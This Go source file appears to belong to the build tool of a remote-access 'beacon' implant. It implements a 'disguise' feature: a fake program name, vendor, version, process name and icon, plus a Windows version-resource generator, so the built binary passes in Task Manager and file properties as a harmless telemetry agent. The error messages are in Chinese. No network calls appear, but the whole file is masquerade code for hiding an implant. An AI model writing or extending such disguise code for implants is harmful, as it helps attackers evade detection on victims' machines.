package litebeacon

import (
	"bytes"
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"math"
	"strings"
)

// DisguiseSpec carries the operator-chosen masquerade identity. A nil spec
// means "no disguise": builds behave exactly as before.
type DisguiseSpec struct {
	DisplayName string // FileDescription, also what Task Manager shows
	Company     string
	Version     string // normalized to four dot-separated numbers
	ProcName    string // runtime ps name, <=15 chars
	Icon        []byte // nil/empty falls back to the bundled icon
}

// bundledIcon is drawn at init: a 32x32 grey ring with a pulse dot — generic
// telemetry-agent art, no real product likeness.
func bundledIcon() []byte {
	const w, h = 32, 32
	const ringInner, ringOuter, dotRadius = 12.5, 15.5, 5.0
	const (
		ringR, ringG, ringB = 0x6a, 0x6f, 0x75
		dotR, dotG, dotB    = 0x9a, 0xa0, 0xa6
	)
	pixels := make([]byte, 0, w*h*4)
	cx, cy := float64(w-1)/2, float64(h-1)/2
	for y := 0; y < h; y++ {
		for x := 0; x < w; x++ {
			dx, dy := float64(x)-cx, float64(y)-cy
			d := math.Sqrt(dx*dx + dy*dy)
			var r, g, b, a byte
			switch {
			case d >= ringInner && d <= ringOuter:
				r, g, b, a = ringR, ringG, ringB, 0xff
			case d <= dotRadius:
				r, g, b, a = dotR, dotG, dotB, 0xff
			}
			pixels = append(pixels, b, g, r, a) // BGRA
		}
	}
	andMask := make([]byte, ((w+31)/32)*4*h)

	var bmp bytes.Buffer
	binary.Write(&bmp, binary.LittleEndian, uint32(40)) // biSize
	binary.Write(&bmp, binary.LittleEndian, int32(w))   // biWidth
	binary.Write(&bmp, binary.LittleEndian, int32(h*2)) // biHeight (XOR+AND rows)
	binary.Write(&bmp, binary.LittleEndian, uint16(1))  // biPlanes
	binary.Write(&bmp, binary.LittleEndian, uint16(32)) // biBitCount
	binary.Write(&bmp, binary.LittleEndian, uint32(0))  // biCompression BI_RGB
	binary.Write(&bmp, binary.LittleEndian, uint32(len(pixels)+len(andMask)))
	binary.Write(&bmp, binary.LittleEndian, uint32(0)) // biXPPM
	binary.Write(&bmp, binary.LittleEndian, uint32(0)) // biYPPM
	binary.Write(&bmp, binary.LittleEndian, uint32(0)) // biClrUsed
	binary.Write(&bmp, binary.LittleEndian, uint32(0)) // biClrImportant
	bmp.Write(pixels)
	bmp.Write(andMask)

	var ico bytes.Buffer
	binary.Write(&ico, binary.LittleEndian, uint16(0)) // reserved
	binary.Write(&ico, binary.LittleEndian, uint16(1)) // type: icon
	binary.Write(&ico, binary.LittleEndian, uint16(1)) // count
	ico.Write([]byte{byte(w), byte(h), 0, 0})          // width, height, colors, reserved
	binary.Write(&ico, binary.LittleEndian, uint16(1)) // planes
	binary.Write(&ico, binary.LittleEndian, uint16(32))
	binary.Write(&ico, binary.LittleEndian, uint32(bmp.Len()))
	binary.Write(&ico, binary.LittleEndian, uint32(6+16))
	ico.Write(bmp.Bytes())
	return ico.Bytes()
}

const (
	maxDisguiseText = 64
	maxProcName     = 15
	maxIconBytes    = 256 * 1024
)

// ParseDisguise validates operator input and normalizes the version to four
// numeric parts. procName may be empty: it then falls back to a truncation of
// the display name (Linux prctl truncates to 15 bytes anyway).
func ParseDisguise(display, company, version, procName string) (*DisguiseSpec, error) {
	display = strings.TrimSpace(display)
	company = strings.TrimSpace(company)
	version = strings.TrimSpace(version)
	procName = strings.TrimSpace(procName)
	if display == "" {
		return nil, fmt.Errorf("伪装显示名不能为空")
	}
	if err := checkTextField("显示名", display); err != nil {
		return nil, err
	}
	if err := checkTextField("厂商", company); err != nil {
		return nil, err
	}
	ver, err := normalizeVersion(version)
	if err != nil {
		return nil, err
	}
	if procName == "" {
		procName = display
		if len(procName) > maxProcName {
			// 显示名回退时才截断；显式给的超长进程名要在下面报错。
			procName = procName[:maxProcName]
		}
	}
	if err := checkProcName(procName); err != nil {
		return nil, err
	}
	return &DisguiseSpec{
		DisplayName: display,
		Company:     company,
		Version:     ver,
		ProcName:    procName,
	}, nil
}

func checkTextField(label, value string) error {
	if len(value) > maxDisguiseText {
		return fmt.Errorf("%s太长，上限 %d 字符", label, maxDisguiseText)
	}
	for _, r := range value {
		if r < 0x20 || r > 0x7e || r == '"' || r == '\\' {
			return fmt.Errorf("%s只能用普通字符，不能带引号或反斜杠", label)
		}
	}
	return nil
}

func checkProcName(name string) error {
	if name == "" {
		return fmt.Errorf("进程名不能为空")
	}
	if len(name) > maxProcName {
		return fmt.Errorf("进程名太长，上限 %d 字符", maxProcName)
	}
	return checkTextField("进程名", name)
}

func normalizeVersion(v string) (string, error) {
	if v == "" {
		return "1.0.0.0", nil
	}
	parts := strings.Split(v, ".")
	if len(parts) > 4 {
		return "", fmt.Errorf("版本号最多 4 段数字")
	}
	nums := make([]string, 4)
	for i := range nums {
		if i < len(parts) {
			p := parts[i]
			if p == "" {
				return "", fmt.Errorf("版本号段不能为空")
			}
			for _, r := range p {
				if r < '0' || r > '9' {
					return "", fmt.Errorf("版本号只能是数字和点")
				}
			}
			if len(p) > 5 {
				return "", fmt.Errorf("版本号某一段太长")
			}
			n := 0
			for _, r := range p {
				n = n*10 + int(r-'0')
			}
			if n > 65535 {
				return "", fmt.Errorf("版本号某一段超出 65535")
			}
			nums[i] = p
		} else {
			nums[i] = "0"
		}
	}
	return strings.Join(nums, "."), nil
}

// SetIcon decodes an uploaded .ico (base64) into the spec. Empty input keeps
// the bundled icon; anything invalid is a hard error.
func SetIcon(spec *DisguiseSpec, iconB64 string) error {
	if strings.TrimSpace(iconB64) == "" {
		spec.Icon = bundledIcon()
		return nil
	}
	data, err := base64.StdEncoding.DecodeString(iconB64)
	if err != nil {
		return fmt.Errorf("图标不是合法 base64")
	}
	if err := validateICO(data); err != nil {
		return err
	}
	spec.Icon = data
	return nil
}

func validateICO(data []byte) error {
	if len(data) < 6 {
		return fmt.Errorf("图标太小，不是 .ico")
	}
	if data[0] != 0 || data[1] != 0 {
		return fmt.Errorf("图标魔数不对")
	}
	if data[2] != 1 || data[3] != 0 {
		return fmt.Errorf("图标类型不对（需要 .ico）")
	}
	count := int(data[4]) | int(data[5])<<8
	if count < 1 || count > 32 {
		return fmt.Errorf("图标条目数异常: %d", count)
	}
	if len(data) > maxIconBytes {
		return fmt.Errorf("图标超过 256KB")
	}
	for i := 0; i < count; i++ {
		base := 6 + i*16
		if base+16 > len(data) {
			return fmt.Errorf("图标目录不完整")
		}
		size := int(uint32(data[base+8]) | uint32(data[base+9])<<8 | uint32(data[base+10])<<16 | uint32(data[base+11])<<24)
		offset := int(uint32(data[base+12]) | uint32(data[base+13])<<8 | uint32(data[base+14])<<16 | uint32(data[base+15])<<24)
		if size <= 0 || offset < 0 || offset+size > len(data) {
			return fmt.Errorf("图标数据越界")
		}
	}
	return nil
}

// generateRC renders a Windows resource script. hasIcon adds `1 ICON` which
// expects icon.ico next to the .rc file.
func generateRC(spec *DisguiseSpec, hasIcon bool, originalFilename string) []byte {
	fv := strings.ReplaceAll(spec.Version, ".", ",")
	var b strings.Builder
	if hasIcon {
		b.WriteString("1 ICON \"icon.ico\"\n\n")
	}
	fmt.Fprintf(&b, "1 VERSIONINFO\nFILEVERSION %s\nPRODUCTVERSION %s\nBEGIN\n", fv, fv)
	b.WriteString("  BLOCK \"StringFileInfo\"\n  BEGIN\n    BLOCK \"040904b0\"\n    BEGIN\n")
	fmt.Fprintf(&b, "      VALUE \"FileDescription\", \"%s\"\n", spec.DisplayName)
	fmt.Fprintf(&b, "      VALUE \"ProductName\", \"%s\"\n", spec.DisplayName)
	fmt.Fprintf(&b, "      VALUE \"CompanyName\", \"%s\"\n", spec.Company)
	fmt.Fprintf(&b, "      VALUE \"FileVersion\", \"%s\"\n", spec.Version)
	fmt.Fprintf(&b, "      VALUE \"ProductVersion\", \"%s\"\n", spec.Version)
	fmt.Fprintf(&b, "      VALUE \"OriginalFilename\", \"%s\"\n", originalFilename)
	b.WriteString("    END\n  END\n  BLOCK \"VarFileInfo\"\n  BEGIN\n")
	b.WriteString("    VALUE \"Translation\", 0x409, 1200\n")
	b.WriteString("  END\nEND\n")
	return []byte(b.String())
}
